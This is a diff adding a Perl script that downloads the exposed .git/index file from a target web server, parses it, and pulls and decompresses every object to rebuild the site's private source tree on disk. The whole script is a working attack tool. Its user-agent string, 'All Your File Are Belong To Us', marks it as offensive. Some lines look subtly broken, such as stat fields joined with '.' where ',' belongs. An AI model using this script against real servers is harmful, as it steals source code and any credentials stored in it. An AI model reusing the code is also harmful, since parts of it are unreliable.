@@ -1,0 +1,145 @@
+#!/usr/bin/perl
+
+use strict;
+use File::Path qw(make_path);
+use LWP::UserAgent;
+use File::Temp qw(tempfile tempdir);
+use Compress::Zlib qw(uncompress);
+
+sub readtime
+{
+   my ($handle, $hashref) = @_;
+
+   read $handle, my $rawtime, 8;
+
+   ( $hashref->{'lsb32'},
+     $hashref->{'nsec'} ) = unpack "NN", $rawtime;
+  
+   return $hashref;
+}
+
+sub readindex
+{
+   my ($infile) = @_;
+   my $packindex;
+    
+   # read the header
+   read $infile, my $rawheader, 12;
+   my $header = {};
+   ($header->{'ident'}, $header->{'version'}, $header->{'entries'})
+      = unpack("a4NN", $rawheader);
+
+   die "Not a git index file" if ($header->{'ident'} ne "DIRC");
+   die "Unsupported version of git index" if ($header->{'version'} != 2);
+
+   my @index_entries = ();
+
+   for (my $i=0; $i<$header->{'entries'}; $i++)
+   {
+      my $statinfo = {};
+      my $entry = {};
+      my $rawdata;
+      my %ctime = ();
+      my %mtime = ();
+
+      $statinfo->{'ctime'}=readtime($infile, \%ctime);
+      $statinfo->{'mtime'}=readtime($infile, \%ctime);
+
+      # read the non-time fields
+      read $infile, $rawdata, 24; 
+      ( $statinfo->{'dev'}.
+        $statinfo->{'inode'}.
+        $statinfo->{'mode'}.
+        $statinfo->{'uid'}.
+        $statinfo->{'gid'}.
+        $statinfo->{'size'} ) = unpack "NNNNNN", $rawdata;
+
+      $entry->{'statinfo'}=$statinfo;
+      read $infile, $rawdata, 20; 
+      ( $entry->{'id'} ) = unpack "H*", $rawdata;
+      $packindex.=$rawdata;
+      read $infile, $rawdata, 2; 
+      ( $entry->{'flags'} ) = unpack "n", $rawdata;
+     
+      # Finally read name - it's length is the lower 11 bits of flags
+      my $namelength=($entry->{'flags'} & 0x7ff)+1;
+
+      # Pad it up to a multiple of 4
+      read $infile, $rawdata, $namelength + (8 - (($namelength + 62) % 8)) %8; 
+      ($entry->{'name'}) = unpack "a" . ($namelength-1), $rawdata;
+       
+      push(@index_entries, $entry);
+   }
+   return @index_entries;
+}
+
+
+# First grab the database file
+my $target=$ARGV[0];
+my $giturl="http://$ARGV[0]/.git/index";
+my $ua=LWP::UserAgent->new;
+print "Target is: $giturl\n";
+$ua->agent("All Your File Are Belong To Us/1.0");
+my $request=HTTP::Request->new(GET => $giturl);
+my $result=$ua->request($request);
+
+if ($result->status_line !~ /^200/)
+{
+   die "Could not find Git index file";
+}
+
+my ($dbfileh, $dbfilen) = tempfile();
+print $dbfileh $result->content;
+close $dbfileh;
+
+open(my $infile, "<", $dbfilen);
+binmode($infile);
+
+print "Decoding index file\n";
+my @index_entries = readindex($infile);
+close($infile);
+unlink($dbfilen);
+my $server=$ARGV[0];
+
+# Now extract the files
+foreach my $entry (@index_entries)
+{
+   my $firsttwo=substr($entry->{'id'},0,2);
+   my $resthash=substr($entry->{'id'},2);
+   
+   my $file=".git/objects/" . $firsttwo . "/" . $resthash;
+   my $rawdata;
+   my $decompressed;
+   my $oh;
+
+   print "Extracting " . $entry->{'name'} . "\n";
+
+   my $giturl="http://$server/$file";
+   my $frequest=HTTP::Request->new(GET => $giturl);
+   my $fresult=$ua->request($frequest);
+   $rawdata=$fresult->content;
+
+   # Make sure the path is there for the output
+   my $outputpath="output/" . $entry->{'name'};
+   $outputpath =~ s#/[^/]*$##g;
+   
+   make_path($outputpath);
+   open $oh, ">", "output/$entry->{'name'}";
+  
+   # Now decompress the data
+   $decompressed=uncompress($rawdata);
+   my $gitfile={};
+
+   ($gitfile->{'type'}) = substr($decompressed,0,5);
+   if ($gitfile->{'type'} ne "blob ")
+   {
+      print "Unknown git file type: $gitfile->{'type'}. Skipping\n";
+      next;
+   }
+   ($gitfile->{'size'}) = unpack "Z*", substr($decompressed,5);
+   ($gitfile->{'data'}) = substr($decompressed,length($gitfile->{'size'})+6);
+   
+   # And write it
+   print $oh $gitfile->{'data'};
+   close($oh);
+}
